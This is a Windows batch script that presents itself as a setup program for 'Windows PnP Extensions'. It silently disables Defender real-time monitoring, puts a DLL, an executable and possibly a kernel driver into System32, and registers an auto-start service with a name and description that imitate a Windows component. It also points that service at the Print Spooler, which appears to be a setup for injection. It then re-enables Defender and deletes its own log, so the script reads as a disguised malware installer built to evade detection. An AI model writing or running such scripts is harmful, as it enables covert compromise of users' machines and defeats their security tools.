@echo off
cd /d "%~dp0"
set Q=%TEMP%\_q.tmp

if not exist "pnpext.dll" (echo [!] pnpext.dll not found & pause & exit /b 1)

echo ============================================
echo  Windows PnP Extensions - Setup
echo ============================================
echo.
echo [1/7] Disabling Defender...
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
waitfor /t 2 x >"%Q%" 2>&1
echo [2/7] Removing old...
sc.exe stop WPnpSvc >"%Q%" 2>&1
waitfor /t 2 x >"%Q%" 2>&1
sc.exe delete WPnpSvc >"%Q%" 2>&1
taskkill.exe /F /IM rundll32.exe >"%Q%" 2>&1
echo [3/7] Copying files...
copy /y "pnpext.dll" "%SystemRoot%\System32\pnpext.dll" >"%Q%" 2>&1
copy /y "WPnpSvc.exe" "%SystemRoot%\System32\WPnpSvc.exe" >"%Q%" 2>&1
if exist "pnpext.sys" (copy /y "pnpext.sys" "%SystemRoot%\System32\drivers\pnpext.sys" >"%Q%" 2>&1)
echo        Files copied
echo [4/7] Creating service...
sc.exe create WPnpSvc binPath= "%SystemRoot%\System32\WPnpSvc.exe" type= own start= auto depend= Spooler DisplayName= "Windows Plug and Play Extensions" >"%Q%" 2>&1
sc.exe description WPnpSvc "Manages extended Plug and Play device configuration and compatibility" >"%Q%" 2>&1
echo [5/7] Configuring...
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WPnpSvc\Parameters" /v DllPath /t REG_SZ /d "%SystemRoot%\System32\pnpext.dll" /f >"%Q%" 2>&1
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WPnpSvc\Parameters" /v TargetService /t REG_SZ /d "Spooler" /f >"%Q%" 2>&1
echo [6/7] Starting Spooler...
sc.exe start Spooler >"%Q%" 2>&1
waitfor /t 3 x >"%Q%" 2>&1
echo [7/7] Starting WPnpSvc...
sc.exe start WPnpSvc >"%Q%" 2>&1
waitfor /t 4 x >"%Q%" 2>&1
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
echo.
echo [+] Done! Service: WPnpSvc
echo.
del "%Q%" >"%TEMP%\_q2.tmp" 2>&1
del "%TEMP%\_q2.tmp" >con 2>&1
pause
